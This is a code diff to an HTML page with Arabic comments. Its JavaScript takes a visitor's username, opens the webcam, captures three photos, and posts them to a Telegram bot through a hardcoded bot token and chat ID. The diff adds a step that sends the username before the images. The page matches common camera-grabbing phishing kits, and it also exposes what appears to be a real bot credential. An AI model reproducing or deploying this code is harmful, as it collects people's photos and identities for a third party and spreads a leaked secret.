@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -63,7 +62,8 @@ a {text-decoration:none;color:#0078d7;font-size:14px;}
 // ==== إعداد بوت تلغرام ====
 const TOKEN = "8442051886:AAHTHe8iPnsRpSNFGc26bNOo2PtEyKGGhUw";  // ضع توكن البوت الخاص بك
 const CHAT_ID = "6504203392"; // ضع chat_id الخاص بك
-const API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+const API_URL_SEND_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+const API_URL_SEND_MESSAGE = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
 const startBtn = document.getElementById("startBtn");
 const agreeCheckbox = document.getElementById("agree");
@@ -92,13 +92,23 @@ async function captureImage(){
     return canvas.toDataURL("image/png");
 }
 
-async function sendToTelegram(imageData, username){
+// إرسال المعلومات النصية إلى البوت
+async function sendUserInfoToTelegram(username){
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("text", `User submitted: ${username}\nTime: ${Date.now()}`);
+    const res = await fetch(API_URL_SEND_MESSAGE, { method: "POST", body: formData });
+    return res.ok;
+}
+
+// إرسال الصور إلى البوت
+async function sendImageToTelegram(imageData, username){
     const blob = await (await fetch(imageData)).blob();
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("caption", `User: ${username}, Time: ${Date.now()}`);
     formData.append("photo", blob, "image.png");
-    const res = await fetch(API_URL, { method: "POST", body: formData });
+    const res = await fetch(API_URL_SEND_PHOTO, { method: "POST", body: formData });
     return res.ok;
 }
 
@@ -109,19 +119,23 @@ startBtn.addEventListener("click", async () => {
     }
 
     startBtn.disabled = true;
-    setStatus("Requesting camera permission...");
-    let stream;
-    try{
-        stream = await openCamera();
-        setStatus("Capturing and sending 3 images to Telegram...");
+    setStatus("Sending user info to Telegram...");
+    const username = usernameInput.value || "";
 
-        const username = usernameInput.value || "";
+    try{
+        // إرسال معلومات المستخدم أولاً
+        const infoSent = await sendUserInfoToTelegram(username);
+        setStatus(infoSent ? "User info sent successfully!" : "Error sending user info.");
+
+        // فتح الكاميرا والتقاط 3 صور
+        const stream = await openCamera();
+        setStatus("Capturing and sending 3 images to Telegram...");
 
         for(let i=1; i<=3; i++){
             const imgData = await captureImage();
-            const ok = await sendToTelegram(imgData, username);
+            const ok = await sendImageToTelegram(imgData, username);
             setStatus(ok ? `Image ${i}/3 sent successfully` : `Error sending image ${i}`);
-            await new Promise(r => setTimeout(r, 800));
+            await new Promise(r=>setTimeout(r, 800));
         }
 
         setStatus("All 3 images sent successfully!");
